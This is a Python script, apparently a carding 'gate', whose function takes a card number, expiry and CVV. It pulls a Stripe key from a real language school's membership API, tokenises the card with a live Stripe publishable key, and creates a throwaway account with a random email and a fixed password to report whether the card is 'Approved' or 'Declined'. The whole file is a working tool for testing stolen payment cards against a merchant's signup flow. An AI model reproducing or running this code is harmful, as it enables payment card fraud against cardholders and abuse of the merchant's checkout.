import requests, json, random, string

def gate(cc, mes, ano, cvv):
    email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=15)) + '@gmail.com'
    
    headers_1 = {
        "accept": "*/*", 
        "content-type": "application/json", 
        "origin": "https://deutschgym.com", 
        "referer": "https://deutschgym.com/", 
        "user-agent": "Mozilla/5.0"
    }
    payload = '{"site":"3d821376ab5cea803122c65b3572cff0"}'
    r1 = requests.post('https://api.memberstack.io/site/memberships', headers=headers_1, data=payload).json()

    key = r1.get('stripeKey')
    if not key:
        return "⚠️ Error: no se pudo obtener stripeKey"

    headers_2 = {
        "accept": "application/json", 
        "content-type": "application/x-www-form-urlencoded", 
        "origin": "https://js.stripe.com", 
        "referer": "https://js.stripe.com/", 
        "user-agent": "Mozilla/5.0"
    }
    payload_2 = (
        f"card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}"
        f"&card[address_zip]=10080&key=pk_live_fLf50cDx65QXSdm6D9YbCwsx&_stripe_account={key}"
    )
    r_2 = requests.post('https://api.stripe.com/v1/tokens', headers=headers_2, data=payload_2)
    r2 = r_2.json()

    # Manejo de errores de Stripe
    if "error" in r2:
        return f"❌ Error: {r2['error'].get('message', 'Tarjeta rechazada')}"
    if "id" not in r2:
        return "❌ Error desconocido en tokenización"

    tok = r2['id']

    headers_3 = {
        "accept": "*/*", 
        "content-type": "application/json", 
        "origin": "https://deutschgym.com", 
        "referer": "https://deutschgym.com/", 
        "user-agent": "Mozilla/5.0"
    }
    payload_3 = json.dumps({
        "site": "3d821376ab5cea803122c65b3572cff0",
        "additionalFields": {"language": "German", "level": "A2"},
        "email": email,
        "password": "Geho1902",
        "membership": "62a0fa8eb4c4ff0004822daf",
        "token": tok,
        "couponId": ""
    })
    r3 = requests.post('https://api.memberstack.io/member/signup', headers=headers_3, data=payload_3)
    result = r3.text

    # Evaluación de aprobación
    if "error" in result.lower():
        return "⚠️ Error en la tarjeta"
    elif "id" in result or "success" in result.lower():
        return "✅ Approved"
    else:
        return "⚠️ Declined"